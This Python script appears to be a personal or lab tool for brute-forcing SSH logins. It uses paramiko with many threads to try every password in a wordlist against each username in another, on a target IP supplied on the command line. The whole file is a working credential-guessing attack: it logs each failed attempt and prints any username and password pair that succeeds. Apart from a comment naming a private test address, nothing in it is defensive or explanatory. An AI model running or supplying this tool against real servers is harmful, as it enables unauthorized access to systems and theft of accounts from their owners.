import argparse
import paramiko
import queue
import time
from threading import Thread

class SSHMultithread():
    #Constructor
    def __init__(self, target_ip, threads, username_file, password_file):
        self.ip = target_ip #test with ip 192.168.43.100, #string
        self.password_file_dir = password_file #directory of desired password wordlist
        self.username_file_dir = username_file #directory of desired username wordlist
        self.password_list=[] #extract from directory, load into password queue
        self.username_list=[] #extract from directory, load into username queue
        self.passwords=queue.LifoQueue() #Passwords queue
        self.usernames=queue.LifoQueue() #Usernames queue
        self.correct_password = None #string
        self.correct_username = None #string      
        self.threads = threads #number of threads

    def do_brute_force(self):
        #print the inputs to be used, code will start after 5s
        self.print_input()

        #read in files
        self.read_usernames_passwords()
        self.fill_usernames()

        #for each username, test all passwords
        while not self.usernames.empty():
                self.do_single_username(self.usernames.get())
   
    #Fill the usernames & passwords into list, then put into queue
    def print_input(self):
        print('Passwords: %s' %(self.password_file_dir))
        print('Usernames: %s' %(self.username_file_dir))
        print('Threads  : %s' %(self.threads))
        print('IP:      : %s\n' %(self.ip))
        print('Start in 5s...')
        time.sleep(5) #Reading time :)

    def read_usernames_passwords(self):
        print('Reading username and password files...')
        try:
            with open(self.password_file_dir) as all_passwords:
                self.password_list = all_passwords.readlines()
                self.password_list = [p.strip() for p in self.password_list]    

            with open(self.username_file_dir) as all_usernames:
                self.username_list = all_usernames.readlines()
                self.username_list = [u.strip() for u in self.username_list]   

        except IOError:
            print('File not found')

    def fill_usernames(self):
        for user in self.username_list:
            self.usernames.put(user)

    def fill_passwords(self):
        #fill in passwords
        for password in self.password_list:
            self.passwords.put(password)

     
    #For each username, do the following
    def do_single_username(self, username):
        thread_list = [] 
        self.fill_passwords()
        for i in range(1,self.threads+1):
            thread = Thread(target=self.do_ssh, args=(username,)) 
            thread.start()
            thread_list.append(thread)

        for thread in thread_list:
            thread.join()

    def do_ssh(self, username):
        if self.correct_password:
            exit(0)
        else:
            while not self.passwords.empty():
                current_pass = self.passwords.get()

                try:
                    ssh_client = paramiko.client.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(hostname=self.ip, username=username,password=current_pass)
                
                    print('Success! [' + username + ':' + current_pass + ']')
                    self.correct_password = current_pass
                    self.correct_username = username
                    exit(0)
        
                except paramiko.AuthenticationException: #for wrong password
                    print('Failed [' + username + ':' + current_pass+']')
                except Exception: #any other exceptions
                    print('Error: username: %s, password: %s' %(username, current_pass))
                finally:
                    self.passwords.task_done()
                    ssh_client.close()

def parse_config():
    #parsing arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('ip',
                        help='Target IP Address, required')
    parser.add_argument('threads', 
                        type=int, 
                        help='Numbers of threads, default is 50', 
                        nargs = '?', 
                        default=50)
    parser.add_argument('passwords',
                        help="Wordlist for password, default is 100pass.txt",
                        nargs='?', 
                        default="100pass.txt")
    parser.add_argument('usernames',
                        help="Wordlist for usernames, default is usernames.txt",
                        nargs='?',
                        default="usernames.txt")
    return parser.parse_args()
                                   
#Main method
if __name__ == '__main__':
    start = time.time()

    #parsing arguments
    args = parse_config()
    number_of_threads=args.threads
    target_ip=args.ip
    password_file= args.passwords
    username_file=args.usernames

    dictionary_ssh = SSHMultithread(target_ip,number_of_threads,username_file,password_file)
    dictionary_ssh.do_brute_force()
    
    end = time.time()
    if not dictionary_ssh.correct_password:
        print('Attack unsuccessful')
    else:
        print('Dictionary attack succeeded with [%s:%s]' \
            %(dictionary_ssh.correct_username, dictionary_ssh.correct_password))
   
    print('\nTime taken: %.3fs' %(end-start))
